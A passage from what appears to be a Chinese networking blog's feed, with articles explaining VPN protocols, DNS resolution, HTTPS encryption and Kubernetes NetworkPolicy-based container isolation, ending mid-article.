仅加密（或验证）数据包的有效负载，但或多或少地保留现有的数据报头数据；</li></ul><p>IPSec传输模式和隧道模式的区别在于：</p><ol><li>从安全性来讲，隧道模式优于传输模式。它可以完全对原始IP数据包进行验证和加密。隧道模式下可以隐藏内部IP地址、协议类型和端口。</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽。</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li></ol><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>以下是当今使用的<strong>最受欢迎的VPN协议</strong>：</p><ol><li><strong>OpenVPN</strong> － OpenVPN是为多种身份验证方法开发的开源项目。它是一种非常通用的协议，可以在具有不同功能的许多不同设备上使用，并可以通过UDP或TCP在任何端口上使用。OpenVPN使用OpenSSL库和TLS协议提供出色的性能和强大的加密。</li><li><strong>WireGuard</strong> － WireGuard是一种较新的VPN协议，与现有VPN协议相比，旨在提供更高的安全性和更好的性能。默认情况下，WireGuard在隐私方面存在一些问题，尽管大多数支持WireGuard的VPN已经克服这些问题。</li><li><strong>IKEv2 &#x2F; IPSec</strong> －带有Internet密钥交换版本2（IPSec &#x2F; IKEv2）的Internet协议安全性是一种快速且安全的VPN协议。它已在许多操作系统（例如Windows、Mac OS和iOS）中自动进行预配置。它特别适合与移动设备重新建立连接。IKEv2的一个缺点是它是由Cisco和Microsoft开发的，不是像OpenVPN这样的开源项目。对于需要快速、轻量级VPN（该VPN安全且可以暂时断开连接以快速重新连接）的移动用户而言，IKEv2 &#x2F; IPSec是一个不错的选择。</li><li><strong>L2TP &#x2F; IPSec</strong> －具有Internet协议安全性也是不错选择。该协议比PPTP更安全，但是由于数据包是双重封装的，因此它并不总能提供最佳响应速度。它通常与移动设备一起使用，并内置在许多操作系统中。</li><li><strong>PPTP</strong> －点对点隧道协议是一种基本的较旧的VPN协议，内置在许多操作系统中。不过，PPTP具有已知的安全漏洞，出于隐私和安全原因，就不太建议选择。</li></ol><p>针对VPN加密，目前AES（高级加密标准）是当今使用的最常见的加密密码之一。大多数VPN使用密钥长度为128位或256位的AES加密。即便是在量子计算方面取得进步，AES-128也被认为是安全的。</p><h3 id="分类标准"><a href="#分类标准" class="headerlink" title="分类标准"></a>分类标准</h3><p>1、按VPN的协议分类：<br>VPN的隧道协议主要有三种，PPTP、L2TP和IPSec，其中PPTP和L2TP协议工作在OSI模型的第二层，又称为二层隧道协议；IPSec是第三层隧道协议。<br>2、按VPN的应用分类：<br>（1）Access VPN（远程接入VPN）：客户端到网关，使用公网作为骨干网在设备之间传输VPN数据流量；<br>（2）Intranet VPN（内联网VPN）：网关到网关，通过公司的网络架构连接来自同公司的资源；<br>（3）Extranet VPN（外联网VPN）：与合作伙伴企业网构成Extranet，将一个公司与另一个公司的资源进行连接。</p><p>3、按所用的设备类型进行分类：<br>网络设备提供商针对不同客户的需求，开发出不同的VPN网络设备，主要为交换机、路由器和防火墙：<br>（1）路由器式VPN：路由器式VPN部署较容易，只要在路由器上添加VPN服务即可；<br>（2）交换机式VPN：主要应用于连接用户较少的VPN网络；<br>（3）防火墙式VPN：防火墙式VPN是最常见的一种VPN的实现方式，许多厂商都提供这种配置类型<br>4、按照实现原理划分：<br>（1）重叠VPN：此VPN需要用户自己建立端节点之间的VPN链路，主要包括：GRE、L2TP、IPSec等众多技术。<br>（2）对等VPN：由网络运营商在主干网上完成VPN通道的建立，主要包括MPLS、VPN技术。</p><h3 id="不同VPN实现对比"><a href="#不同VPN实现对比" class="headerlink" title="不同VPN实现对比"></a>不同VPN实现对比</h3><table><thead><tr><th align="left"></th><th align="left">L2TP</th><th align="left">SSL VPN</th><th align="left">IPSec</th></tr></thead><tbody><tr><td align="left">发起方</td><td align="left">远端PC</td><td align="left">远端PC</td><td align="left">总部、分支、远端PC</td></tr><tr><td align="left">身份验证</td><td align="left">基于PPP认证</td><td align="left">用户名+口令+证书</td><td align="left">地址或名字+口令或证书</td></tr><tr><td align="left">加密保证</td><td align="left">无</td><td align="left">有</td><td align="left">有</td></tr><tr><td align="left">地址分配</td><td align="left">有</td><td align="left">有</td><td align="left">无</td></tr><tr><td align="left">客户端</td><td align="left">XP自带或第三方</td><td align="left">免安装式浏览器插件</td><td align="left">通常为厂家设备内部实现，PC使用厂家专用客户端</td></tr><tr><td align="left">兼容互通性</td><td align="left">优良，基本上各个厂家都兼容XP客户端</td><td align="left">PC使用浏览器打开VPN，与浏览器相关</td><td align="left">优良，已经达到工业化标准成都，大部分厂家能够互通</td></tr><tr><td align="left">资源消耗</td><td align="left">轻</td><td align="left">重</td><td align="left">中</td></tr><tr><td align="left">性能加速</td><td align="left">无</td><td align="left">加密卡硬件加速</td><td align="left">加密卡硬件加速</td></tr><tr><td align="left">隧道穿越NAT</td><td align="left">可以</td><td align="left">可以</td><td align="left">可以</td></tr></tbody></table><p>从上表可以看出，L2TP和SSL VPN确实更适合远端PC，特别是SSL VPN就是专门为远端PC开发的VPN技术。而IPSec更适合在分支和总部之间搭建VPN隧道。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E8%99%9B%E6%93%AC%E7%A7%81%E4%BA%BA%E7%B6%B2%E8%B7%AF">VPN</a></li><li><a href="https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol">PPTP(Point to Point Tunneling Protocol)</a></li><li><a href="https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol">L2TP(Layer 2 Tunneling Protocol)</a></li><li><a href="https://en.wikipedia.org/wiki/IPsec">IPSec</a></li><li><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">SSL&#x2F;TLS(Secure Sockets Layer &#x2F; Transport Layer Security)</a></li><li><a href="https://www.asafety.fr/projects-and-tools/c-client-serveur-ssl-tls-multiplateformes-avec-openssl/">Client&#x2F;Serveur SSL&#x2F;TLS multiplateformes avec OpenSSL</a></li><li><a href="http://www.escotal.com/osilayer.html">OSI 7 LAYER MODEL</a></li><li><a href="https://zhuanlan.zhihu.com/p/369908696">VPN协议与加密</a></li><li><a href="https://time.geekbang.org/column/article/10386">趣谈网络协议</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：DNS协议</title>
    <link href="/2023/03/12/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/03/12/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：DNS协议"><a href="#应用层协议：DNS协议" class="headerlink" title="应用层协议：DNS协议"></a>应用层协议：DNS协议</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h2><p><strong>网域名称系统</strong>（英语：<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem，缩写：<strong>DNS</strong>）是<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a>的一项服务。它作为将<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D">域名</a>和<a href="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>相互<a href="https://zh.wikipedia.org/wiki/%E6%98%A0%E5%B0%84">映射</a>的一个<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93">分布式数据库</a>，能够使人更方便地访问<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a>。DNS 协议运行在 UDP 之上，DNS使用<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>和<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">UDP</a><a href="https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">端口</a>53[<a href="https://zh.wikipedia.org/zh-hans/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F#cite_note-1">1]</a>。</p><p>在网络世界，也是这样的。你肯定记得住网站的名称，但是很难记住网站的 IP 地址，因而也需要一个地址簿，就是 <strong>DNS 服务器</strong>，它是一个由分层的 DNS 服务器(DNS server)实现的分布式数据库;它还是一个使得主机能够查询分布式数据库的应用层协议。</p><p><img src="https://s4.51cto.com/oss/202101/19/66e6aabb9a6b65ba6a46e9873b5be7cf.png" alt="img"></p><p>DNS 最早的设计是只有一台 DNS 服务器。这台服务器会包含所有的 DNS 映射。这是一种集中式的设计，这种设计并不适用于当今的互联网，因为互联网有着数量巨大并且持续增长的主机，这种集中式的设计会存在以下几个问题</p><ul><li>单点故障(a single point of failure)，如果 DNS 服务器崩溃，那么整个网络随之瘫痪。</li><li>通信容量(traaffic volume)，单个 DNS 服务器不得不处理所有的 DNS 查询，这种查询级别可能是上百万上千万级</li><li>远距离集中式数据库(distant centralized database)，单个 DNS 服务器不可能 邻近 所有的用户，假设在美国的 DNS 服务器不可能临近让澳大利亚的查询使用，其中查询请求势必会经过低速和拥堵的链路，造成严重的时延。</li><li>维护(maintenance)，维护成本巨大，而且还需要频繁更新。</li></ul><p>所以 DNS 不可能集中式设计，它完全没有可扩展能力，因此需要采用<strong>分布式设计</strong>，接下来介绍它的相关特点</p><h2 id="报文结构"><a href="#报文结构" class="headerlink" title="报文结构"></a>报文结构</h2><p>DNS 有两种报文，一种是查询报文，一种是响应报文，并且这两种报文有着相同的格式，下面是 DNS 的报文格式</p><p><img src="https://s4.51cto.com/oss/202101/19/c2fc42808a2a73456010cc52c3b79efb.png" alt="img"></p><p>上图显示了 DNS 的报文格式，其中事务 ID、标志、问题数量、回答资源记录数、权威名称服务器计数、附加资源记录数这六个字段是 DNS 的报文段首部，报文段首部一共有 12 个字节。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><h3 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构"></a>分层结构</h3><p><img src="https://s5.51cto.com/oss/202101/19/188ab4b953d416645db6b828557deb50.png" alt="img"></p><ul><li>根 DNS 服务器 ：返回顶级域 DNS 服务器的 IP 地址</li><li>顶级域 DNS 服务器：返回权威 DNS 服务器的 IP 地址</li><li>权威 DNS 服务器 ：返回相应主机的 IP 地址</li></ul><h3 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h3><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了资源记录(Resource Record, RR)，RR 提供了主机名到 IP 地址的映射。每个 DNS 回答报文中会包含一条或多条资源记录。RR 记录用于回复客户端查询。</p><p>资源记录是一个包含了下列字段的 4 元组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">(Name, Value, Type, TTL) <br></code></pre></td></tr></table></figure><p>DNS系统中，<strong>RR</strong>常见的资源记录类型有：</p><ul><li>主机记录（A记录）：RFC 1035定义，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</li><li>别名记录（CNAME记录）: RFC 1035定义，CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。</li><li>IPv6主机记录（AAAA记录）: RFC 3596定义，与A记录对应，用于将特定的主机名映射到一个主机的<a href="https://zh.wikipedia.org/wiki/IPv6">IPv6</a>地址。</li><li>服务位置记录（SRV记录）: RFC 2782定义，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。</li><li>域名服务器记录（NS记录） ：用来指定该域名由哪个DNS服务器来进行解析。 您注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的，DNS服务器NS记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com等。 简单的说，NS记录是指定由哪个DNS服务器解析你的域名。</li><li>NAPTR记录：RFC 3403定义，它提供了<a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">正则表达式</a>方式去映射一个域名。NAPTR记录非常著名的一个应用是用于<a href="https://zh.wikipedia.org/w/index.php?title=ENUM&action=edit&redlink=1">ENUM</a>查询。</li></ul><h3 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h3><p><strong>通常情况下，DNS 的查找会经历下面这些步骤</strong></p><ol><li>用户在浏览器中输入网址 <a href="http://www.example.com/">www.example.com</a> 并点击回车后，查询会进入网络，并且由 DNS 解析器进行接收。</li><li>DNS 解析器会向根域名发起查询请求，要求返回顶级域名的地址。</li><li>根 DNS 服务器会注意到请求地址的前缀并向 DNS 解析器返回 com 的顶级域名服务器(TLD) 的 IP 地址列表。</li><li>然后，DNS 解析器会向 TLD 服务器发送查询报文</li><li>TLD 服务器接收请求后，会根据域名的地址把权威 DNS 服务器的 IP 地址返回给 DNS 解析器。</li><li>最后，DNS 解析器将查询直接发送到权威 DNS 服务器</li><li>权威 DNS 服务器将 IP 地址返回给 DNS 解析器</li><li>DNS 解析器将会使用 IP 地址响应 Web 浏览器</li></ol><p>一旦 DNS 查找的步骤返回了 example.com 的 IP 地址，浏览器就可以请求网页了。</p><p><strong>解析流程如下：</strong></p><p><img src="https://static001.geekbang.org/resource/image/71/e8/718e3a1a1a7927302b6a0f836409e8e8.jpg?wh=1456*1212" alt="img"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://www.51cto.com/article/641655.html">万字长文爆肝 DNS 协议！</a></p><p>2.维基百科：<a href="https://zh.wikipedia.org/zh-hans/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">https://zh.wikipedia.org/zh-hans/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F</a></p><p>3.<a href="https://time.geekbang.org/column/article/9492">趣谈网络协议</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：HTTPS协议</title>
    <link href="/2023/03/11/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTPS%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/03/11/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTPS%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：HTTPS协议"><a href="#应用层协议：HTTPS协议" class="headerlink" title="应用层协议：HTTPS协议"></a>应用层协议：HTTPS协议</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：一般理解为HTTP+SSL&#x2F;TLS，通过 SSL证书来验证服务器的身份，并为浏览器和服务器之间的通信进行加密。</p><h3 id="SSL又是什么？"><a href="#SSL又是什么？" class="headerlink" title="SSL又是什么？"></a><strong>SSL又是什么？</strong></h3><p>SSL（Secure Socket Layer，安全套接字层）：1994年为 Netscape 所研发，SSL 协议位于 TCP&#x2F;IP 协议与各种应用层协议之间，为数据通讯提供安全支持。</p><p>TLS（Transport Layer Security，传输层安全）：其前身是 SSL，它最初的几个版本（SSL 1.0、SSL 2.0、SSL 3.0）由网景公司开发，1999年从 3.1 开始被 IETF 标准化并改名，发展至今已经有 TLS 1.0、TLS 1.1、TLS 1.2 三个版本。SSL3.0和TLS1.0由于存在安全漏洞，已经很少被使用到。TLS 1.3 改动会比较大，目前还在草案阶段，目前使用最广泛的是TLS 1.1、TLS 1.2。</p><h3 id="SSL发展史（互联网加密通信）"><a href="#SSL发展史（互联网加密通信）" class="headerlink" title="SSL发展史（互联网加密通信）"></a><strong>SSL发展史（互联网加密通信）</strong></h3><ol><li>1994年NetSpace公司设计SSL协议（Secure Sockets Layout）1.0版本，但未发布。</li><li>1995年NetSpace发布SSL&#x2F;2.0版本，很快发现有严重漏洞</li><li>1996年发布SSL&#x2F;3.0版本，得到大规模应用</li><li>1999年，发布了SSL升级版TLS&#x2F;1.0版本，目前应用最广泛的版本</li><li>2006年和2008年，发布了TLS&#x2F;1.1版本和TLS&#x2F;1.2版本</li></ol><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p><strong>加密和解密使用同一个密钥</strong>，我们在点外卖时，假设你和外卖网站约定了一个密钥，你发送请求的时候用这个密钥进行加密，外卖网站用同样的密钥进行解密。这样就算中间的黑客截获了你的请求，但是它没有密钥，还是破解不了。这看起来很完美，但是中间有个问题，你们两个怎么来约定这个密钥呢？如果这个密钥在互联网上传输，也是很有可能让黑客截获的。黑客一旦截获这个秘钥，它可以佯作不知，静静地等着你们两个交互。这时候你们之间互通的任何消息，它都能截获并且查看，就等你把银行卡账号和密码发出来。</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p><strong>使用两个密钥，公开密钥和私有密钥</strong>，非对称加密的私钥放在外卖网站这里，不会在互联网上传输，这样就能保证这个密钥的私密性。但是，对应私钥的公钥，是可以在互联网上随意传播的，只要外卖网站把这个公钥给你，你们就可以愉快地互通了。比如说你用公钥加密，说“我要定外卖”，黑客在中间就算截获了这个报文，因为它没有私钥也是解不开的，所以这个报文可以顺利到达外卖网站，外卖网站用私钥把这个报文解出来，然后回复，“那给我银行卡和支付密码吧”。先别太乐观，这里还是有问题的。回复的这句话，是外卖网站拿私钥加密的，互联网上人人都可以把它打开，当然包括黑客。那外卖网站可以拿公钥加密吗？当然不能，因为它自己的私钥只有它自己知道，谁也解不开。另外，这个过程还有一个问题，黑客也可以模拟发送“我要定外卖”这个过程的，因为它也有外卖网站的公钥。为了解决这个问题，看来一对公钥私钥是不够的，客户端也需要有自己的公钥和私钥，并且客户端要把自己的公钥，给外卖网站。这样，客户端给外卖网站发送的时候，用外卖网站的公钥加密。而外卖网站给客户端发送消息的时候，使用客户端的公钥。这样就算有黑客企图模拟客户端获取一些信息，或者半路截获回复信息，但是由于它没有私钥，这些信息它还是打不开。</p><h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p><strong>数字证书是一种权威性的电子文档，它提供了一种在 Internet 上验证身份的方式。 其作用类似于司机的驾驶执照或日常生活中的身份证。</strong>      不对称加密也会有同样的问题，如何将不对称加密的公钥给对方呢？一种是放在一个公网的地址上，让对方下载；另一种就是在建立连接的时候，传给对方。这两种方法有相同的问题，那就是，作为一个普通网民，你怎么鉴别别人给你的公钥是对的。会不会有人冒充外卖网站，发给你一个它的公钥。接下来，你和它所有的互通，看起来都是没有任何问题的。毕竟每个人都可以创建自己的公钥和私钥。</p><p>这个时候就需要权威部门的介入了，就像每个人都可以打印自己的简历，说自己是谁，但是有公安局盖章的，就只有户口本，这个才能证明你是你。这个由权威部门颁发的称为<strong>证书（Certificate</strong>）。证书里面有什么呢？当然应该有公钥，这是最重要的；还有证书的所有者，就像户口本上有你的姓名和身份证号，说明这个户口本是你的；另外还有证书的发布机构和证书的有效期，这个有点像身份证上的机构是哪个区公安局，有效期到多少年。这个证书是怎么生成的呢？会不会有人假冒权威机构颁发证书呢？就像有假身份证、假户口本一样。生成证书需要发起一个证书请求，然后将这个请求发给一个权威机构去认证，这个权威机构我们称为 <strong>CA（ Certificate Authority）</strong>。</p><p>将这个请求发给权威机构，权威机构会给这个证书卡一个章，我们称为<strong>签名算法</strong>。问题又来了，那怎么签名才能保证是真的权威机构签名的呢？当然只有用只掌握在权威机构手里的东西签名了才行，这就是 CA 的私钥。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><img src="https://static001.geekbang.org/resource/image/df/b4/df1685dd308cef1db97e91493f911ab4.jpg?wh=2285*4076" alt="img"></p><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p>从上图可以知道HTTPS的加密流程，HTTPS组合使用了对称加密和非对称加密</p><ol><li>服务端生成了一对公钥和私钥，把公钥和证书发给客户端</li><li>客户端验证了证书真伪</li><li>客户端生成一个随机值，用公钥加密发给了服务端</li><li>服务端用私钥解密，获取了随机值</li><li>服务端使用该随机值作为密钥和客户端进通信</li></ol><p><strong>服务端的公钥和私钥就是非对称加密，客户端生成的随机值作为密钥来通信就是对称加密</strong></p><h2 id="HTTPS的缺点"><a href="#HTTPS的缺点" class="headerlink" title="HTTPS的缺点"></a><strong>HTTPS的缺点</strong></h2><ul><li>HTTPS协议多次握手，导致页面的加载时间延长近50%；</li><li>HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗；</li><li>申请SSL证书需要钱，功能越强大的证书费用越高。</li><li>SSL涉及到的安全算法会消耗 CPU 资源，对服务器资源消耗较大。</li></ul><h2 id="HTTPS和HTTP的区别"><a href="#HTTPS和HTTP的区别" class="headerlink" title="HTTPS和HTTP的区别"></a><strong>HTTPS和HTTP的区别</strong></h2><ul><li>HTTPS是HTTP协议的安全版本，HTTP协议的数据传输是明文的，是不安全的，HTTPS使用了SSL&#x2F;TLS协议进行了加密处理。</li><li>http和https使用连接方式不同，默认端口也不一样，http是80，https是443。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>加密分对称加密和非对称加密。对称加密效率高，但是解决不了密钥传输问题；非对称加密可以解决这个问题，但是效率不高。</li><li>非对称加密需要通过证书和权威机构来验证公钥的合法性。</li><li>HTTPS 是综合了对称加密和非对称加密算法的 HTTP 协议。既保证传输安全，也保证传输效率。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://zhuanlan.zhihu.com/p/72616216">十分钟搞懂HTTP和HTTPS协议？</a></p><p>2.维基百科：<a href="https://zh.wikipedia.org/zh-hans/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/zh-hans/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE</a></p><p>3.<a href="https://time.geekbang.org/column/article/9492">趣谈网络协议</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>云原生场景下的容器网络隔离技术</title>
    <link href="/2023/03/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/03/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="云原生场景下的容器网络隔离技术"><a href="#云原生场景下的容器网络隔离技术" class="headerlink" title="云原生场景下的容器网络隔离技术"></a>云原生场景下的容器网络隔离技术</h1><h3 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h3><p>随着云计算时代的到来，尤其是容器化技术的飞速发展，云原生作为云计算的未来阶段，其安全势必成为云安全的主要战场。从目前的云原生环境来看，云原生网络安全问题层出不穷，威胁程度逐渐上升，从业人员面临着严峻的挑战。</p><p>例如，此前Akamai公司进行了一项实验，将一个简单的Docker容器蜜罐用于攻击测试，结果显示该容器在24小时内被攻击者用于四起不同的犯罪活动，这些攻击的目的各不相同：一起攻击试图使用容器作为代理，以访问数据流或其他服务，另一起企图让目标感染僵尸网络，还有一起执行加密货币挖掘，最后一起是通过容器针对居家办公用户实施诈骗。</p><p>此外，2018年特斯拉AWS上部署的K8S Dashboard因为暴露在公网，没有做认证和授权控制，也没有对网络访问做控制，导致黑客直接从dashboard中获取S3凭证，从而获取遥测数据，恶意拉取POD，进行挖矿行为。</p><p>从上面案例我们可以看出，云原生安全不仅仅要应对传统安全问题，更面临着全新的挑战。在众多安全技术手段中，网络隔离技术作为最早、最基础、最为核心的安全技术手段之一，本文章也将重点围绕着网络隔离技术，以传统隔离与云原生隔离两个角度进行分析，着重对容器网络隔离技术做介绍。</p><h3 id="二、传统的隔离技术–传统防火墙"><a href="#二、传统的隔离技术–传统防火墙" class="headerlink" title="二、传统的隔离技术–传统防火墙"></a>二、传统的隔离技术–传统防火墙</h3><p>随着云计算的普及，网络边界日渐模糊，这使得传统防火墙基于边界流量实现隔离显得有点格格不入，无法适配云原生场景下的隔离需求。</p><p>传统防火墙作为实现传统隔离的重要手段，在云原生场景下，主要面临着以下几个问题：</p><p><strong>1. 容器 IP 的多变性，一旦容器ip地址改变，针对不变的ip地址为“锚点”实现的防火墙访问控制将无法生效;</strong></p><p><strong>2. 网络攻击隐蔽且多变，业务平台需更强的威胁识别和处置能力；</strong></p><p><strong>3. 云原生场景下，对灵活弹性扩展需求高，需要安全策略和能力快速匹配；</strong></p><p>此外，在CNCF 发布的《云原生安全白皮书》也指出传统基于边界的安全防护机制，如防火墙等，在云原生的场景下很难面面俱到。所以，在云原生场景下，为了更好保护我们的业务容器安全，我们需要一些新的隔离技术去实现网络隔离。</p><h3 id="三、云原生隔离技术–容器代理实现的隔离方法"><a href="#三、云原生隔离技术–容器代理实现的隔离方法" class="headerlink" title="三、云原生隔离技术–容器代理实现的隔离方法"></a>三、云原生隔离技术–容器代理实现的隔离方法</h3><p><strong>3.1 基于k8s实现的容器隔离</strong></p><p>关于云原生场景下的原生的网络隔离技术，其中Kubernetes提供了NetworkPolicy和istio中的AuthorizationPolicy ，两者都支持按Namespace级别的网络隔离，达到访问外部资源隔离的目的。其中NetworkPolicy还支持按pod级别去做网络访问控制，利用label指定namespaces或pod，底层通过iptables实现，是大家比较熟悉的pod访问控制实现技术，下面我们简单介绍一下NetworkPolicy的使用场景。</p><p><strong>NetworkPolicy使用场景示例如下：</strong></p><p>要求只容许指定pod访问服务：</p><p>其网络策略如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">kind: NetworkPolicy<br>apiVersion: networking.k8s.io/v1<br>metadata:<br>  name: api-allow<br>spec:<br>  podSelector:<br>    matchLabels:    <span class="hljs-comment">//匹配的lable如下</span><br>      app: bookstore <br>      role: api<br>  ingress:<br>  - from:<br>      - podSelector:<br>          matchLabels:      <span class="hljs-comment">//指定可以容许访问的pod需要的lable</span><br>            app: bookstore<br></code></pre></td></tr></table></figure><p><strong>实现效果如下：</strong></p><p><img src="https://s.secrss.com/anquanneican/b885c972bd3e41ca8af53de638d91603.jpg" alt="img"></p><p>从上面示例可以看出，NetworkPolicy可以通过指定对应的labels实现对Namespace 和Pod 级别的网络隔离。对比于传统的单一外部防火墙，NetworkPolicy实现了在一个集群内的pod间网络隔离。也就是在某些需要的 Pod 之间架起防火墙，实现了细粒度的pod网络访问隔离策略。正是因为它的这些优点，目前市面上的容器安全产品的网络隔离有很多都有一些NetworkPolicy的影子。</p><p>但是如果要基于NetworkPolicy做一个安全产品的网络隔离技术时，NetworkPolicy还是存在着很多缺点，主要是以下几点：</p><ul><li><strong>性能差</strong>，无法满足大规模网络场景的隔离需求（目前各个cni在NetworkPolicy 的实现上，一般基于iptables的方式，假如流量或者需要管控的pod过多时，对集群性能影响较大，甚至可能导致 iptables不堪重负）；</li><li><strong>适用性差</strong>，目前类似于Flannel 这种流行的cni插件，并没有实现对NetworkPolicy的支持。此外，对于非k8s的场景下，例如docker compose、docker Swarm、OpenShift等环境，NetworkPolicy并不能支持；</li><li><strong>细粒度不够</strong>，目前NetworkPolicy只能实现对Namespace 和Pod 级别的网络隔离，对于docker直接起的业务容器，并不能够起到防护作用。此外，目前NetworkPolicy也只能做到四层网络的防护，并不能实现对第七层网络级别的防护；</li><li><strong>易用性差</strong>，每次配置都需要创建对应的yaml、无法实现自动化部署，存在效率低的问题。此外，对于开发或者运维人员很难做到“一配即中”的效果，而规则错误很可能导致业务受影响，配置难度和试错成本极高；</li><li><strong>灵活性差</strong>，云原生场景下，对灵活弹性扩展需求高，需要安全策略和能力快速匹配。</li></ul><p>总的来说，NetworkPolicy在当前阶段，只适用于部分场景对小规模的pod进行网络隔离，不能作为一个成熟的网络隔离技术在安全产品中使用。</p><p><strong>3.2 